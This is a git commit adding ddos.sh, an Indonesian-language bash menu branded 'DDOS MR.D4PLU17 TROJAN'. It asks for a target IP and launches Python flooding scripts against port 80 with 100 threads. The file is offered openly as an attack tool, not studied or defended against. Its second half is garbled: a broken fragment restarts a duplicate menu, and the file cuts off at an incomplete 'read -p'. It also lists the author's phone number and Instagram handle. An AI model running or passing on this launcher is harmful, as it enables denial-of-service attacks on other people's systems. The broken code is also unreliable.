edfa600688f18555d1dade25953694e2a3e4cdbf
Ragilf <52344423+Ragilf@users.noreply.github.com>
2019-06-29 21:18:45 +0700

    ddos

---
+++ ddos.sh
@@ -0,0 +1,69 @@
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
+clear
+toilet -f slant " DDOS MR.D4PLU17 TROJAN " |lolcat
+echo
+echo
+echo $blue"---------------------------------------"
+echo $blue"AUTOUR  :MR.D4PLU17/ InDoNeSiA CYBER ErRoR SyStEm "
+echo $blue"VERSION :1.0"
+echo $blue"JUDUL     :DDOS MR.D4PLU17 TROJAN "
+echo $red"---------------------------------------"
+echo $green"?Contact IG:febryan_ragil      "
+echo $green"?WhatsApp:+6281353739702             "
+echo $green"?Message :YANG MAKE HARUS JOMBLO "
+echo $red"---------------------------------------"
+echo $yellow"                 OMOM"
+echo $red"---------------------------------------"
+echo $white"[1].VIRUS TROJAN"
+echo $white"[2].VIRUS DROID"
+echo $white"[3].VIRUS DDOS"
+echo $white"[4].VIRUS HAMMER"
+echo $white"[5].VIRUS VIRUS"
+echo $white"[0].EXIT"
+echo $red"---------------------------------------"
+echo $red"MASUKAN PILIHAN ANDA"
+read -p "PILIH>>==>" bro;
+echo
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+clear
+toilet -f slant " VIRUS TROJAN " |lolcat
+echo $red"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python win.32.64.NT.py -s$ipt -p80 -t100
+fi
+
+if [ $bro = 2 ] || [ $bro = 2 ]
+then
+toilet -f slant " VIRUS DROID " |lolcat
+echo $red"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python andromeda.py -s$ipt -p80 -t100
+fi
+ :DDOS VIRUS TROJAN "
+echo $red"---------------------------------------"
+echo $green"?Contact IG:febryan_ragil        "
+echo $green"?WhatsApp:+6281353739702              "
+echo $green"?Message :YANG PAKE HARUS JOMBLO   "
+echo $red"---------------------------------------"
+echo $yellow"                 OMOM"
+echo $red"---------------------------------------"
+echo $white"[1].VIRUS TROJAN"
+echo $white"[2].VIRUS DROID"
+echo $white"[3].VIRUS DDOS"
+echo $white"[4].VIRUS HAMMER"
+echo $white"[5].VIRUS VIRUS"
+echo $white"[0].EXIT"
+echo $red"---------------------------------------"
+echo $red"MASUKAN PILIHAN ANDA"
+read -p
